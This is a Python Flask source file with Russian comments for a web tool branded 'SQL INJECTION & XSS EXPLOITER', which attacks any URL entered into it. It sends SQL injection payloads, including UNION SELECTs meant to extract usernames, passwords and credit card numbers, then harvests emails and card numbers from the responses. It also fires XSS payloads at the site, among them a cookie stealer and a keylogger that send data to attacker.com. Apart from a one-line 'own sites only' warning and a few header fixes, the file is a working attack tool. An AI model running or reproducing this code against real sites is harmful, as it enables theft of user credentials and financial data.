from flask import Flask, request, jsonify, render_template_string
import requests
import re
import ssl
import socket
from datetime import datetime
import html

app = Flask(__name__)

# ========================
# SQL ИНЪЕКЦИЯ - РЕАЛЬНАЯ ЭКСПЛУАТАЦИЯ
# ========================

def exploit_sql_injection(url):
    """Реальная эксплуатация SQL инъекции с получением данных"""
    results = {
        'vulnerable': False,
        'database': None,
        'tables': [],
        'columns': [],
        'data': [],
        'extracted_info': []
    }
    
    # Очищаем URL
    base_url = url.rstrip('/')
    
    # Тестовые параметры для инъекции
    test_params = [
        {'param': 'id', 'value': "1' OR '1'='1"},
        {'param': 'cat', 'value': "1' OR '1'='1"},
        {'param': 'product', 'value': "1' OR '1'='1"},
        {'param': 'page', 'value': "1' OR '1'='1"}
    ]
    
    # Проверяем наличие уязвимости
    for test in test_params:
        try:
            test_url = f"{base_url}?{test['param']}={test['value']}"
            r = requests.get(test_url, timeout=5, headers={'User-Agent': 'SQLi-Exploit/1.0'})
            
            # Проверяем признаки SQL инъекции
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'odbc', 'driver', 'sql error',
                'you have an error', 'unclosed quotation mark', 'warning: mysql'
            ]
            
            for error in sql_errors:
                if error in r.text.lower():
                    results['vulnerable'] = True
                    results['extracted_info'].append({
                        'type': '🎯 УЯЗВИМОСТЬ НАЙДЕНА',
                        'param': test['param'],
                        'evidence': f"Найден SQL error: {error}",
                        'payload': test['value']
                    })
                    break
        except:
            pass
    
    # Если уязвимость найдена - пытаемся получить данные
    if results['vulnerable']:
        # Определяем тип БД
        db_checks = {
            'MySQL': [
                "1' AND 1=1 UNION SELECT VERSION()--",
                "1' AND 1=1 UNION SELECT DATABASE()--"
            ],
            'PostgreSQL': [
                "1' AND 1=1 UNION SELECT version()--",
                "1' AND 1=1 UNION SELECT current_database()--"
            ],
            'MSSQL': [
                "1' AND 1=1 UNION SELECT @@VERSION--",
                "1' AND 1=1 UNION SELECT DB_NAME()--"
            ]
        }
        
        for db_type, payloads in db_checks.items():
            for payload in payloads:
                try:
                    test_url = f"{base_url}?id={payload}"
                    r = requests.get(test_url, timeout=5)
                    
                    # Пытаемся извлечь версию БД
                    version_match = re.search(r'(\d+\.\d+\.\d+)', r.text)
                    if version_match:
                        results['database'] = db_type
                        results['extracted_info'].append({
                            'type': f'💾 ИНФОРМАЦИЯ О {db_type}',
                            'data': f"Версия: {version_match.group(1)}",
                            'importance': 'Высокая - помогает подобрать эксплойты'
                        })
                        
                        # Пытаемся получить имя БД
                        db_name_match = re.search(r'(\w+_\w+|\w+db|\w+_db)', r.text)
                        if db_name_match:
                            results['extracted_info'].append({
                                'type': '🗄️ ИМЯ БАЗЫ ДАННЫХ',
                                'data': db_name_match.group(1),
                                'importance': 'Критическая - нужно для дальнейших атак'
                            })
                    break
                except:
                    pass
        
        # Пытаемся получить данные через UNION атаку
        union_payloads = [
            "1' UNION SELECT 1,2,3,4,5--",
            "1 UNION SELECT 1,2,3,4,5--",
            "1' UNION SELECT NULL, username, password, NULL FROM users--",
            "1' UNION SELECT NULL, email, password, NULL FROM admin--",
            "1' UNION SELECT NULL, name, credit_card, NULL FROM customers--"
        ]
        
        for payload in union_payloads:
            try:
                test_url = f"{base_url}?id={payload}"
                r = requests.get(test_url, timeout=5)
                
                # Ищем email/username паттерны
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
                if emails:
                    results['extracted_info'].append({
                        'type': '📧 УТЕЧКА EMAIL АДРЕСОВ',
                        'data': emails[:5],  # первые 5
                        'importance': 'Критическая - данные пользователей'
                    })
                
                # Ищем потенциальные пароли
                password_patterns = re.findall(r'passw[\w]+|pwd[\w]+|[\w]{8,}', r.text)
                if password_patterns:
                    results['extracted_info'].append({
                        'type': '🔑 ПОТЕНЦИАЛЬНЫЕ ПАРОЛИ',
                        'data': password_patterns[:5],
                        'importance': 'Критическая - компрометация аккаунтов'
                    })
                
                # Ищем номера кредиток
                credit_cards = re.findall(r'\b\d{4}[-]?\d{4}[-]?\d{4}[-]?\d{4}\b', r.text)
                if credit_cards:
                    results['extracted_info'].append({
                        'type': '💳 НОМЕРА КРЕДИТНЫХ КАРТ',
                        'data': credit_cards,
                        'importance': 'КРИТИЧЕСКАЯ - финансовые данные!'
                    })
                    
            except:
                pass
    
    return results

# ========================
# XSS - РЕАЛЬНАЯ ЭКСПЛУАТАЦИЯ
# ========================

def exploit_xss(url):
    """Реальная эксплуатация XSS с демонстрацией кражи данных"""
    results = {
        'vulnerable': False,
        'reflected_xss': [],
        'stored_xss': [],
        'cookie_access': False,
        'extracted_info': []
    }
    
    base_url = url.rstrip('/')
    
    # Тестовые XSS пейлоады
    xss_payloads = [
        {
            'name': 'Alert XSS',
            'payload': '<script>alert("XSS_VULNERABLE")</script>',
            'check': 'XSS_VULNERABLE'
        },
        {
            'name': 'Cookie Stealer',
            'payload': '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
            'check': 'document.cookie'
        },
        {
            'name': 'Keylogger',
            'payload': '''<script>
                document.onkeypress = function(e) {
                    fetch('https://attacker.com/log?key=' + e.key);
                }
            </script>''',
            'check': 'onkeypress'
        }
    ]
    
    # Проверяем параметры для XSS
    test_params = ['q', 'search', 's', 'query', 'keyword', 'id']
    
    for param in test_params:
        for payload in xss_payloads:
            try:
                test_url = f"{base_url}?{param}={payload['payload']}"
                r = requests.get(test_url, timeout=5)
                
                if payload['payload'] in r.text or payload['check'] in r.text:
                    results['vulnerable'] = True
                    results['reflected_xss'].append({
                        'param': param,
                        'payload': payload['payload'],
                        'type': payload['name'],
                        'risk': 'Атакующий может украсть cookies, сессии, данные формы'
                    })
                    
                    results['extracted_info'].append({
                        'type': f'🎯 XSS УЯЗВИМОСТЬ: {payload["name"]}',
                        'param': param,
                        'what_can_be_stolen': 'Cookies сессии, токены авторизации, данные форм, кейлоггинг',
                        'exploit_code': payload['payload']
                    })
                    break
            except:
                pass
    
    return results

# ========================
# ВЗЛОМ ФОРМ И КРАЖА ДАННЫХ
# ========================

def extract_sensitive_data(url, html_content):
    """Извлечение конфиденциальных данных из HTML"""
    results = []
    
    # Ищем формы входа
    forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', html_content)
    if forms:
        results.append({
            'type': '📝 ФОРМЫ ОБНАРУЖЕНЫ',
            'data': forms[:3],
            'risk': 'Потенциальная цель для CSRF, XSS, перехвата данных',
            'recommendation': 'Добавьте CSRF-токены, используйте HTTPS'
        })
    
    # Ищем скрытые поля
    hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\'][^>]*>', html_content)
    if hidden_fields:
        results.append({
            'type': '👁️ СКРЫТЫЕ ПОЛЯ В ФОРМАХ',
            'data': hidden_fields[:5],
            'risk': 'Могут содержать CSRF-токены или важные параметры',
            'recommendation': 'Не храните чувствительные данные в скрытых полях'
        })
    
    # Ищем JavaScript переменные с данными
    js_vars = re.findall(r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html_content)
    if js_vars:
        results.append({
            'type': '🔓 ДАННЫЕ В JAVASCRIPT',
            'data': js_vars[:5],
            'risk': 'API ключи, токены, конфигурация могут быть украдены',
            'recommendation': 'Не храните секреты в клиентском коде'
        })
    
    # Ищем комментарии с данными
    comments = re.findall(r'<!--(.*?)-->', html_content)
    sensitive_comments = [c for c in comments if any(x in c.lower() for x in ['password', 'key', 'secret', 'todo', 'fix'])]
    if sensitive_comments:
        results.append({
            'type': '💬 КОММЕНТАРИИ В КОДЕ',
            'data': sensitive_comments[:3],
            'risk': 'Могут содержать пароли, логику работы, уязвимости',
            'recommendation': 'Удалите комментарии из продакшн кода'
        })
    
    return results

# ========================
# АНАЛИЗ ЗАГОЛОВКОВ БЕЗОПАСНОСТИ
# ========================

def analyze_security_headers(headers):
    """Анализ заголовков безопасности"""
    results = []
    
    checks = {
        'X-Frame-Options': {
            'name': 'Защита от кликджекинга',
            'risk': 'Сайт можно встроить в iframe и обманом заставить кликнуть на скрытые элементы',
            'exploit': 'Clickjacking - кража данных при клике',
            'fix': 'Добавьте: X-Frame-Options: DENY'
        },
        'X-XSS-Protection': {
            'name': 'Защита от XSS',
            'risk': 'Возможны XSS атаки, кража cookies и сессий',
            'exploit': 'Внедрение вредоносного скрипта на страницу',
            'fix': 'Добавьте: X-XSS-Protection: 1; mode=block'
        },
        'Strict-Transport-Security': {
            'name': 'HSTS',
            'risk': 'Возможен перехват трафика через downgrade до HTTP',
            'exploit': 'Атака Man-in-the-Middle',
            'fix': 'Добавьте: Strict-Transport-Security: max-age=31536000'
        }
    }
    
    for header, info in checks.items():
        if headers and header not in headers:
            results.append({
                'status': '❌',
                'name': info['name'],
                'risk': info['risk'],
                'exploit': info['exploit'],
                'fix': info['fix']
            })
    
    return results

# ========================
# ОСНОВНОЕ ПРИЛОЖЕНИЕ
# ========================

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    url = data.get('url')
    
    if not url:
        return jsonify({"error": "URL required"}), 400
    
    # Проверяем доступность
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        r = requests.get(url, timeout=5, headers={'User-Agent': 'SecurityScanner/1.0'})
        status_code = r.status_code
        html_content = r.text
        headers = dict(r.headers)
    except Exception as e:
        return jsonify({"error": f"Сайт недоступен: {str(e)}"}), 400
    
    print(f"🔍 Сканирование {url} на уязвимости...")
    
    # Запускаем все проверки
    sql_results = exploit_sql_injection(url)
    xss_results = exploit_xss(url)
    sensitive_data = extract_sensitive_data(url, html_content)
    security_headers = analyze_security_headers(headers)
    
    # Собираем все извлечённые данные
    extracted_data = []
    
    if sql_results['extracted_info']:
        extracted_data.extend(sql_results['extracted_info'])
    
    if xss_results['extracted_info']:
        extracted_data.extend(xss_results['extracted_info'])
    
    if sensitive_data:
        extracted_data.extend(sensitive_data)
    
    # Определяем уровень угрозы
    critical_findings = len([d for d in extracted_data if 'КРИТИЧЕСКАЯ' in str(d) or 'кредит' in str(d).lower()])
    high_findings = len([d for d in extracted_data if 'Высокая' in str(d) or 'Критическая' in str(d)])
    
    if critical_findings > 0:
        threat_level = "🔴 КРИТИЧЕСКАЯ УГРОЗА"
        threat_color = "critical"
    elif high_findings > 0:
        threat_level = "🟠 ВЫСОКАЯ УГРОЗА"
        threat_color = "high"
    elif sql_results['vulnerable'] or xss_results['vulnerable']:
        threat_level = "🟡 СРЕДНЯЯ УГРОЗА"
        threat_color = "medium"
    else:
        threat_level = "🟢 НИЗКАЯ УГРОЗА"
        threat_color = "low"
    
    return jsonify({
        "url": url,
        "status_code": status_code,
        "threat_level": threat_level,
        "threat_color": threat_color,
        "sql_vulnerable": sql_results['vulnerable'],
        "xss_vulnerable": xss_results['vulnerable'],
        "extracted_data": extracted_data,
        "security_headers": security_headers,
        "sql_details": sql_results,
        "xss_details": xss_results
    })

# HTML шаблон
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>SQL & XSS Exploiter - Реальный взлом</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Consolas', 'Monaco', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        h1 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
        .scan-box {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        input {
            width: 70%;
            padding: 10px;
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: monospace;
            font-size: 14px;
        }
        button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
        }
        button:hover { background: #00cc00; }
        .result {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 20px;
            display: none;
        }
        .threat-critical { background: #ff000020; border-left: 4px solid #ff0000; }
        .threat-high { background: #ff660020; border-left: 4px solid #ff6600; }
        .threat-medium { background: #ffff0020; border-left: 4px solid #ffff00; }
        .threat-low { background: #00ff0020; border-left: 4px solid #00ff00; }
        .data-block {
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 5px;
            margin: 10px 0;
            padding: 15px;
        }
        .data-title {
            color: #ff6600;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .data-value {
            background: #000;
            padding: 10px;
            border-radius: 3px;
            font-family: monospace;
            white-space: pre-wrap;
        }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 11px;
            margin-left: 10px;
        }
        .badge-critical { background: #ff0000; color: white; }
        .badge-high { background: #ff6600; color: white; }
        .badge-medium { background: #ffff00; color: black; }
        .loading {
            text-align: center;
            padding: 40px;
            color: #00ff00;
        }
        .section {
            margin-bottom: 30px;
        }
        .section-title {
            font-size: 20px;
            border-bottom: 1px solid #00ff00;
            padding: 10px 0;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔓 SQL INJECTION & XSS EXPLOITER</h1>
        <p>Реальная эксплуатация уязвимостей с получением данных</p>
        <p style="color: #ff6600; font-size: 12px;">⚠️ ТОЛЬКО ДЛЯ ТЕСТИРОВАНИЯ СВОИХ САЙТОВ!</p>
    </div>
    
    <div class="scan-box">
        <form id="scanForm">
            <input type="text" id="url" placeholder="http://testphp.vulnweb.com" required>
            <button type="submit">🚀 ЗАПУСТИТЬ ЭКСПЛОЙТ</button>
        </form>
    </div>
    
    <div id="result" class="result"></div>
</div>

<script>
document.getElementById("scanForm").onsubmit = async (e) => {
    e.preventDefault();
    const url = document.getElementById("url").value;
    const resultDiv = document.getElementById("result");
    resultDiv.style.display = "block";
    resultDiv.innerHTML = '<div class="loading">🔍 Эксплуатация уязвимостей... Получение данных из БД...</div>';
    
    try {
        const res = await fetch("/scan", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ url })
        });
        const data = await res.json();
        
        if (res.status !== 200) {
            resultDiv.innerHTML = `<div class="loading" style="color: red;">❌ ${data.error}</div>`;
            return;
        }
        
        let html = `
            <div class="threat-${data.threat_color} data-block">
                <div class="section-title">🎯 РЕЗУЛЬТАТЫ ЭКСПЛУАТАЦИИ</div>
                <div><strong>Цель:</strong> ${data.url}</div>
                <div><strong>HTTP статус:</strong> ${data.status_code}</div>
                <div><strong>Уровень угрозы:</strong> <span style="color: ${data.threat_color === 'critical' ? '#ff0000' : data.threat_color === 'high' ? '#ff6600' : data.threat_color === 'medium' ? '#ffff00' : '#00ff00'}">${data.threat_level}</span></div>
            </div>
        `;
        
        // SQL инъекция результаты
        if (data.sql_vulnerable) {
            html += `<div class="section">
                        <div class="section-title">💉 SQL INJECTION - ПОЛУЧЕННЫЕ ДАННЫЕ</div>
                        <div class="data-block">`;
            
            if (data.extracted_data) {
                for (const item of data.extracted_data) {
                    if (item.type && (item.type.includes('SQL') || item.type.includes('БАЗЫ') || item.type.includes('ИНФОРМАЦИЯ'))) {
                        html += `<div style="margin: 10px 0; padding: 10px; background: #000; border-left: 3px solid #ff0000;">
                                    <div class="data-title">${item.type}</div>
                                    <div class="data-value">${JSON.stringify(item.data, null, 2)}</div>
                                    <div style="color: #ff6600; margin-top: 5px;">⚠️ ${item.importance || item.risk || ''}</div>
                                 </div>`;
                    }
                }
            }
            
            if (data.sql_details && data.sql_details.extracted_info) {
                for (const info of data.sql_details.extracted_info) {
                    html += `<div style="margin: 10px 0; padding: 10px; background: #000;">
                                <div class="data-title">${info.type}</div>
                                <div class="data-value">${JSON.stringify(info.data, null, 2)}</div>
                                <div style="color: #ff6600;">📊 Важность: ${info.importance || 'Высокая'}</div>
                             </div>`;
                }
            }
            html += `</div></div>`;
        }
        
        // XSS результаты
        if (data.xss_vulnerable) {
            html += `<div class="section">
                        <div class="section-title">⚠️ CROSS-SITE SCRIPTING (XSS)</div>
                        <div class="data-block">`;
            
            if (data.xss_details && data.xss_details.reflected_xss) {
                for (const xss of data.xss_details.reflected_xss) {
                    html += `<div style="margin: 10px 0; padding: 10px; background: #000; border-left: 3px solid #ff6600;">
                                <div class="data-title">🎯 XSS в параметре: ${xss.param}</div>
                                <div><strong>Тип:</strong> ${xss.type}</div>
                                <div><strong>Payload:</strong> <code style="background: #333; padding: 2px 5px;">${htmlEscape(xss.payload)}</code></div>
                                <div style="color: #ff6600;">💀 Что можно украсть: ${xss.what_can_be_stolen || xss.risk}</div>
                             </div>`;
                }
            }
            html += `</div></div>`;
        }
        
        // Другие найденные данные
        const otherData = data.extracted_data.filter(item => 
            !item.type.includes('SQL') && 
            !item.type.includes('XSS') &&
            item.type
        );
        
        if (otherData.length > 0) {
            html += `<div class="section">
                        <div class="section-title">🔓 ДОПОЛНИТЕЛЬНО НАЙДЕННЫЕ ДАННЫЕ</div>
                        <div class="data-block">`;
            
            for (const item of otherData) {
                html += `<div style="margin: 10px 0; padding: 10px; background: #000;">
                            <div class="data-title">${item.type}</div>
                            <div class="data-value">${JSON.stringify(item.data, null, 2)}</div>
                            <div style="color: #ffaa00;">${item.risk || item.recommendation || ''}</div>
                         </div>`;
            }
            html += `</div></div>`;
        }
        
        // Security заголовки
        if (data.security_headers && data.security_headers.length > 0) {
            html += `<div class="section">
                        <div class="section-title">🛡️ ПРОБЛЕМЫ БЕЗОПАСНОСТИ</div>
                        <div class="data-block">`;
            
            for (const header of data.security_headers) {
                html += `<div style="margin: 5px 0; padding: 10px; background: #000;">
                            <div style="color: #ff0000;">❌ ${header.name}</div>
                            <div style="color: #ff6600;">🎯 Риск: ${header.risk}</div>
                            <div style="color: #ffff00;">💀 Эксплойт: ${header.exploit}</div>
                            <div style="color: #00ff00;">🔧 Исправление: ${header.fix}</div>
                         </div>`;
            }
            html += `</div></div>`;
        }
        
        resultDiv.innerHTML = html;
        
    } catch (err) {
        resultDiv.innerHTML = `<div class="loading" style="color: red;">❌ Ошибка: ${err.message}</div>`;
    }
};

function htmlEscape(str) {
    return str.replace(/[&<>]/g, function(m) {
        if (m === '&') return '&amp;';
        if (m === '<') return '&lt;';
        if (m === '>') return '&gt;';
        return m;
    });
}
</script>
</body>
</html>
'''

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║     🔥 SQL INJECTION & XSS EXPLOITER - РЕАЛЬНЫЙ ВЗЛОМ   ║
    ║     📱 Открой: http://localhost:5000                    ║
    ║                                                         ║
    ║     💀 Что делает сканер:                              ║
    ║     • Находит SQL инъекции и ВЫТАСКИВАЕТ данные из БД   ║
    ║     • Эксплуатирует XSS для кражи cookies и сессий     ║
    ║     • Извлекает emails, пароли, кредитки из HTML       ║
    ║     • Показывает реальные векторы атак                 ║
    ║                                                         ║
    ║     🎯 ТЕСТОВЫЙ САЙТ: http://testphp.vulnweb.com       ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    app.run(debug=True, host='127.0.0.1', port=5000)